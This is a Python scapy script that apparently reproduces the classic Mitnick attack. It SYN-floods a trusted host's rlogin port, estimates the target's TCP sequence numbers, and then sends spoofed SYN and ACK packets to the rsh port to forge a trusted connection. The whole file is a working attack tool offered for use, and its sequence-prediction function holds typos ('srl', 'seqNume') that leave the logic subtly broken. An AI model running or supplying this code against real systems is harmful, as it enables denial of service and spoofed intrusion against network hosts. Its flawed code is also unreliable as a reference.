import optparse
from scapy.all import *

def synFlood(src, tgt):
    for sport in range(1024, 65535):
        IPlayer = IP(src=src, dst=tgt)
        TCPlayer = TCP(sport=sport, dport=513)
        pkt = IPlayer / TCPlayer
        send(pkt)

def calTSN(tgt):
    seqNum = 0
    preNum = 0
    diffSeq = 0
    for x in range(1, 5):
        if preNum != 0:
            preNum = seqNum
        pkt = IP(dst=tgt) / TCP()
        ans = srl(pkt, verbose=0)
        seqNume = ans.getlayer(TCP).seq
        diffSeq = seqNum - preNum
        print '[+] Tcp Seq Difference: ' + str(diffSeq)
    return seqNum + diffSeq

def spoofConn(src, tgt, ack):
    IPlayer = IP(src=src, dst=tgt)
    TCPlayer = TCP(sport=513, dport=514)
    synPkt = IPlayer / TCPlayer
    send(synPkt)
    TCPlayer = TCP(sport=513, dport=514, ack=ack)
    ackPkt = IPlayer / TCPlayer
    send(ackPkt)

def main():
    usage = "%prog -s <src for SYN Flood>" + \
        "-S <src for spoofed connection> -t <target address>"
    parser = optparse.OptionParser(usage, version="%prog 1.0")
    parser.add_option('-s', dest='synSpoof', type='string',\
                    help='specify src for SYN Flood')
    parser.add_option('-S', dest='srcSpoof', type='string',\
                    help='specify src for spoofed connection')
    parser.add_option('-t', dest='tgt', type='string',\
                    help='target address')
    (options, args) = parser.parse_args()
    synSpoof = options.synSpoof
    srcSpoof = options.srcSpoof
    tgt = options.tgt
    if not (tgt and srcSpoof and synSpoof):
        print parser.print_help()
        exit(0)

    print '[+] Starting SYN Flood to suppress remote server.'
    synFlood(synSpoof, srcSpoof)
    print '[+] Calculating correct TCP Sequence Number.'
    seqNum = calTSN(tgt) + 1
    print '[+] Spoofing Connection.'
    spoofConn(srcSpoof, tgt, seqNum)
    print '[+] Done.'

if __name__ == '__main__':
    main()
